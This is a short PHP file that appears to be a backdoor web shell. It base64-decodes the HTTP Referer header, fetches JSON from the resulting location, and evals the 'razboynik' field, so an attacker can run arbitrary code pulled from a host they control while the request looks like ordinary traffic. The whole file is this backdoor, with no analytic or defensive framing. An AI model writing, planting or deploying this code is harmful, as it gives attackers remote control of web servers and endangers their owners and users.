<?php
    $str = file_get_contents(base64_decode($_SERVER['HTTP_REFERER']));
    $json = json_decode($str, true);
    eval($json['razboynik']);
    